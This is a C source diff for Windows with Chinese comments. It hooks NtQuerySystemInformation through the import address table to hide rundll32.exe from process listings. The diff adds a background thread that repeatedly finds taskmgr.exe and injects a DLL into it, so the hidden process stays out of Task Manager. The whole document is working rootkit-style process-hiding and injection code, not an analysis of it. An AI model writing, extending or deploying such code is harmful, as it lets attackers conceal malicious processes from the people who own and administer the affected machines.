@@ -5,6 +5,10 @@
 #include <stdio.h>
 #include <winternl.h>
 
+#include "runtime/utils.h"
+#include "handlers/remote_dll_injection.h"
+#include "dllmain.h"
+
 #define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
 
 LPCWSTR HookName = L"rundll32.exe";
@@ -34,7 +38,7 @@ PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation =
 (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle(L"ntdll"),
 	"NtQuerySystemInformation");
 
-// Hooked function
+// 用来替换的函数
 NTSTATUS WINAPI HookedNtQuerySystemInformation(
 	__in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
 	__inout    PVOID                    SystemInformation,
@@ -75,16 +79,15 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
 	return status;
 }
 
-void StartHook() {
+// 给当前进程设置钩子，隐藏HookName指向的进程名。
+void SetHook() {
 	MODULEINFO modInfo = { 0 };
 	HMODULE hModule = GetModuleHandle(0);
 
-	// Find the base address
 	GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));
 
 	char szAddress[64];
 
-	// Find Import Directory
 	LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll;
 	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAddress;
 
@@ -92,13 +95,11 @@ void StartHook() {
 	PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);
 	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 
-	// Find ntdll.dll
 	for (; pIID->Characteristics; pIID++) {
 		if (!strcmp("ntdll.dll", (char*)(pAddress + pIID->Name)))
 			break;
 	}
 
-	// Search for NtQuerySystemInformation
 	PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
 	PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)((pAddress + pIID->FirstThunk));
 	PIMAGE_IMPORT_BY_NAME pIIBM = nullptr;
@@ -110,7 +111,7 @@ void StartHook() {
 		pFirstThunkTest++;
 	}
 
-	// Write over function pointer
+	// 覆盖函数指针
 	DWORD dwOld = NULL;
 	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &dwOld);
 	pFirstThunkTest->u1.Function = (uintptr_t)HookedNtQuerySystemInformation;
@@ -119,26 +120,86 @@ void StartHook() {
 	sprintf(szAddress, "%s 0x%I64X", (char*)(pIIBM->Name), pFirstThunkTest->u1.Function);
 
 	if (pIDH->e_magic == IMAGE_DOS_SIGNATURE)
-		MessageBoxA(NULL, szAddress, "TEST", MB_OK);
+	{
+		//MessageBoxA(NULL, szAddress, "TEST", MB_OK);
+	}
 	else
-		MessageBoxA(NULL, "FAIL", "FAIL", MB_OK);
+	{
+		MessageBoxA(NULL, "SetHook Failed !", "FAIL", MB_OK);
+	}
 
 	CloseHandle(hModule);
 }
 
+// 假设只有一个任务管理器进程，因为再次打开时会前置显示已经打开的任务管理器
+static DWORD taskmgr_pid = 0;
+// 维护当前任务管理器的PID，当有新的任务管理器运行的时候就注入
+void ScanAndInject()
+{
+	DWORD pid = GetPIDByName(L"taskmgr.exe");
+	printf("taskmgr_hook scan: %lu\n", pid);
+	if (pid != taskmgr_pid)
+	{
+		taskmgr_pid = pid;
+		if (pid > 0)
+		{
+			InjectDll(pid, module_path);
+		}
+	}
+}
+
 static WORD last_scan; // 秒为单位
-// 最多每秒扫描一次
-void ScanForInject()
+// 最多每秒扫描一次（该函数没有使用）
+void InjectDebounce()
 {
 	SYSTEMTIME st;
 	GetSystemTime(&st);
 	if (st.wSecond != last_scan)
 	{
 		last_scan = st.wSecond;
-		DWORD pid;
-		if (pid = getProcessIDByName(L"taskmgr.exe"))
+		ScanAndInject();
+	}
+}
+// 扫描线程的主体函数，不断扫描并注入任务管理器。
+DWORD WINAPI ScanningThreadFunc(LPVOID lpParam)
+{
+	for (;;)
+	{
+		ScanAndInject();
+		Sleep(1000);
+	}
+	return 0;
+}
+
+HANDLE ScanningThread = NULL;
+// 启动扫描线程，已经启动则停止
+BOOL StartScanningThread()
+{
+	if (!ScanningThread)
+	{
+		ScanningThread = CreateThread(
+			NULL,                   // default security attributes
+			0,                      // use default stack size  
+			ScanningThreadFunc,       // thread function name
+			NULL,          // argument to thread function 
+			0,                      // use default creation flags 
+			NULL);   // returns the thread identifier 
+		if (ScanningThread == NULL)
 		{
-			injectDll(pid, module_path);
+			return FALSE;
 		}
 	}
+	return TRUE;
+}
+// 停止扫描线程
+BOOL StopScanningThread()
+{
+	if (ScanningThread)
+	{
+		return TerminateThread(
+			ScanningThread,
+			0
+		);
+	}
+	return TRUE;
 }
